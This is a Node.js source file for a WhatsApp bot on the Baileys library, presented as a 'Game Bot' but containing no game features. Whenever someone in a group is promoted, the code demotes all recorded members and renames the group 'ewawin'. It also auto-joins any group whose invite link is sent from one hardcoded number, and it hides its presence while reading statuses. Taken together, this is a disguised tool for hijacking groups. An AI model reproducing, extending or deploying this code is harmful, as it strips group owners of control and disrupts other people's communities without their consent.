qrwa = null, PORT = process.env.PORT || 3000, qrcode = require('qrcode'), fs = require('fs'), wm = "Powered by Shironeki", botname = "Game Bot by Shironeki", prefix = '#', Pino = require("pino"), util = require('util');
const {
  default: makeWASocket,
  fetchLatestBaileysVersion,
  MessageRetryMap,
  useMultiFileAuthState,
  DisconnectReason,
  delay,
  getContentType,
  generateWAMessageFromContent,
  proto,
  jidDecode
} = require('baileys'), msgRetryCounterMap = MessageRetryMap || {}, dbFilePath = 'database.json';

const express = require('express');
const app = express();

app.listen(PORT, function() {
  console.log('Server is running on port 3000');
});

const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const loadDatabase = async () => {
  try {
    const data = await fs.promises.readFile(dbFilePath, 'utf-8');
    global.db = JSON.parse(data);
  } catch (error) {
    console.error('Error while loading database:', error);
  }
  global.db.chats = global.db.chats || {};
};
global.loadDatabase = loadDatabase;
loadDatabase();
setInterval(async () => {
  try {
    await fs.promises.writeFile(dbFilePath, JSON.stringify(global.db));
  } catch (error) {
    console.error('Error while saving database:', error);
  }
}, 30 * 1000);
const startSock = async () => {
  const {
    state,
    saveCreds
  } = await useMultiFileAuthState('sessions');
  const {
    version,
    isLatest
  } = await fetchLatestBaileysVersion();
  console.log(`using WA v${version.join('.')}, isLatest: ${isLatest}`);
  const sock = makeWASocket({
    version,
    logger: Pino({
      level: 'error'
    }),
    printQRInTerminal: true,
    auth: state,
    markOnlineOnConnect: false
  });
  ownernum = jidDecode(sock.user.id).user+'@s.whatsapp.net'
  sock.ev.on('group-participants.update', async (jam) => {
    if (jam.action == 'promote') {
      await sock.groupParticipantsUpdate(jam.id, global.db.chats[jam.id].members, 'demote')
      await sleep(30000)
      try {
        await sock.groupUpdateSubject(jam.id, 'ewawin')
      } catch (e) {
        console.log(e)
      }
    } else if (jam.action == 'add' || jam.action == 'remove') {
    let ad = await sock.groupMetadata(jam.id)
    let ma = ad.participants.map(wad => wad.id)
    let waw = ma.indexOf(ownernum)
    if (waw !== -1) {
      ma.splice(waw, 1);
    }
    global.db.chats[jam.id].members = ma
    }
  })
  sock.ev.process(async (events) => {
    if (events['connection.update']) {
      const update = events['connection.update'];
      const {
        connection,
        lastDisconnect,
        qr
      } = update;
      if (qr) {
        let qrkode = await qrcode.toDataURL(qr, {
            scale: 20
          }),
          qrwa = Buffer.from(qrkode.split`,` [1], 'base64')
      };
      if (connection === 'open') {
        await sock.sendMessage(ownernum, {
          text: `Bot is active now ✅`
        }), qrwa = null
      };
      if (connection === 'close') {
        qrwa = null;
        if ((lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut) {
          await startSock()
        } else {
          console.log('Connection closed. You are logged out.')
        }
      }
      console.log('connection update', update)
    };
    if (events['presence.update']) {
      await sock.sendPresenceUpdate('unavailable')
    }
    if (events['messages.upsert']) {
      const upsert = events['messages.upsert'];
      for (let msg of upsert.messages) {
        if (msg.key.remoteJid === 'status@broadcast') {
          if (msg.message?.protocolMessage) return console.log(`See status ${msg.pushName} ${msg.key.participant.split('@')[0]}\n`);
          await sock.readMessages([msg.key]);
          await delay(1000);
          return sock.readMessages([msg.key])
        } else {
          type = getContentType(msg.message)
          body = (type === 'conversation') ? msg.message.conversation : (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : ''
          budy = (typeof body == 'string' ? body : '')
          let regex = /(?:https?:\/\/)?chat.whatsapp.com\/(?:invite\/)?([0-9A-Za-z]{22})/;
          if (msg.key.remoteJid == '6287816958357@s.whatsapp.net' && budy.includes('https://chat.whatsapp.com/')) {
            try {
              let id = budy.match(regex)[1];
              sock.groupAcceptInvite(id)
              .then(err => {
                console.log(err)
              })
            } catch (e) {
              console.log(e)
            }
          }
            try {
              let ad = await sock.groupMetadata(msg.key.remoteJid)
              let ma = ad.participants.map(wad => wad.id)
              let waw = ma.indexOf(ownernum)
              if (waw !== -1) {
                ma.splice(waw, 1);
              }
              let chats = global.db.chats[msg.key.remoteJid]
              if (typeof chats !== 'object' || chats == null) global.db.chats[msg.key.remoteJid] = {}
               if (chats) {
                  if (!('members' in chats)) chats.members = ma
                } else global.db.chats[msg.key.remoteJid] = {
                    members: ma,
                }
              } catch (e) {
                console.log(e)
              }
        }
      }
    };
    if (events['creds.update']) {
      await saveCreds()
    }
  });
  return sock
};
startSock();
process.on('uncaughtException', console.error)
